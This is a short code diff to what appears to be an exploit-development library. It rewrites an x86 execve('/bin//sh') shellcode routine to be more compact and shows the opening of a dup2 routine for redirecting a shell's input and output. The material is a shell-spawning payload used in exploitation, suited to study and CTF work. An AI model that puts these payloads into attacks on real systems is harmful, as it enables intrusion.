@@ -140,16 +140,13 @@ class x86_64:
 
 class x86_shellcode:
   shell = x86.assemble(""" ; execve("/bin//sh", 0, 0);
-    xor eax, eax
-    push eax
+    xor ecx, ecx
+    mul ecx
+    push ecx
     push 0x68732f2f
     push 0x6e69622f
     mov ebx, esp
-    push eax
-    push ebx
-    xor ecx, ecx
-    xor edx, edx
-    mov al, 0xb
+    mov al, 11
     int 0x80
     """)
   dup2_ebx = x86.assemble(""" ; dup2(ebx, 2); dup2(ebx, 1); dup2(ebx, 0)
